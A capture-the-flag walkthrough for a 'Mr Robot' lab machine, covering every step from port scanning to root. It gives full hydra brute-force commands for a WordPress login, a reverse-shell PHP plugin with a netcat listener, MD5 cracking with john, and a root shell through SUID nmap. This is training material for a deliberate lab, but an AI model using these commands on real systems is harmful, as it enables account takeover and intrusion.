I scan with nmap to reveal that port 80(http) and 443(https) is open, while 22(ssh) closed.

using gobuster, i found a `/robots` file which show that they have
`fsocity.dic` which is a dictionary for bruteforcing the wordpress(based on wp-something result) login and the first flag.

bruteforce using hydra to `link/wp-login` with this command:
`hydra -L fsocity.dic -p test 10.10.113.106 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.113.106%2Fwp-admin%2F&testcookie=1:F=Invalid username"`  to get user: Elliot.

Then use 
`hydra -l Elliot -P fsocity.dic mrrobot.thm http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.113.106%2Fwp-admin%2F&testcookie=1:S=302"` to get password

After log in to the wordpress, you can install plugins that is available in kali linux in `/usr/share/webshells/php/php-reverse-shell.php`, with some edit on top so that it can be read by the wordpress.
```php
/*  
Plugin Name:  Reverse Shell  
Plugin URI: http://shell.com  
Description: gimme a shell  
Version: 1.0  
Author: me  
Author URI: http://www.me.com  
Text Domain: shell  
Domain Path: /languages  
*/
```

Set up netcat with `nc -lvnp 1337`. Activate the plugin to get a reverse shell.

As domain user, you can see that the user `robot` have the second flag and his password in md5. And the md5 password can be read by anyone.

crack the password with john by this command:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 robot_pass 
```
To get the user `robot` password. Use `su -l robot` and input the password to get the second flag.

The third flag required the `root` access, so you must use privilege escalation. Either try some linux priv escalation technique, or use some script like LinEnum(available in `/opt/LinEnum` in kali linux).
Finding file with suid set with command:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
You can see that nmap is set with SUID. Looking at gtfobins, nmap with SUID can be used to spawn root shell by this command:

```bash
$ nmap --interactive  
  
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )  
Welcome to Interactive Mode -- press h <enter> for help  
nmap> !sh  
# whoami  
root
```
basically, old nmap version can run in Interactive mode, which can spawn root shell. Then you get the third flag in root home folder(`/root`).